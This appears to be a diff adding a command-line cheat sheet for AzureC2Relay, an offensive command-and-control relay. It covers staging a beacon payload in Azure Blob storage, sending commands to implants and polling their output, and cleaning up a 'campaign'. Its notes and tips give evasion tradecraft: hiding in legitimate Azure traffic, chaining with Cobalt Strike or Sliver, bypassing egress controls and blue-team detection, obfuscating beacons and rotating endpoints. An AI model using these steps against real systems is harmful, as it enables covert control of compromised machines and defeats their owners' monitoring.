@@ -1,0 +1,52 @@
+# ================= AzureC2Relay =================
+# Clone the AzureC2Relay repository
+git clone https://github.com/0xZDH/AzureC2Relay.git
+cd AzureC2Relay
+
+# Set up a virtual environment (optional but recommended)
+python3 -m venv venv
+source venv/bin/activate
+
+# Install required Python packages
+pip install -r requirements.txt
+
+# ---------------- CONFIGURATION ----------------
+# Edit the config file with Azure credentials and storage details
+nano config.yaml
+
+# Required parameters:
+# - AZURE_STORAGE_ACCOUNT
+# - AZURE_STORAGE_KEY
+# - CONTAINER_NAME
+# - FUNCTION_URL (for Azure Function endpoint)
+
+# ---------------- USAGE ----------------
+# Start the C2 Relay
+python3 AzureC2Relay.py
+
+# Use with other frameworks:
+# Point your implant to the Azure Function or Blob URL as the staging/C2 channel
+
+# ---------------- SAMPLE WORKFLOW ----------------
+# 1. Upload beacon payload to Azure Blob
+python3 upload_beacon.py --file mypayload.exe
+
+# 2. Relay command to implant
+python3 AzureC2Relay.py --command "whoami" --target <agent_id>
+
+# 3. Poll for response
+python3 poll_responses.py --target <agent_id>
+
+# ---------------- CLEANUP ----------------
+# Delete Azure blobs or functions created for the campaign
+python3 cleanup.py
+
+# ---------------- NOTES ----------------
+# - AzureC2Relay leverages legitimate Azure services to blend in with normal traffic
+# - Can be chained with Cobalt Strike, Sliver, Havoc, etc., via redirectors
+# - Useful for bypassing network egress restrictions and blue team detection
+
+# ---------------- TIPS ----------------
+# Use obfuscated beacon payloads
+# Rotate container names or function URLs periodically
+# Consider using Azure CDN for stealthier traffic routing
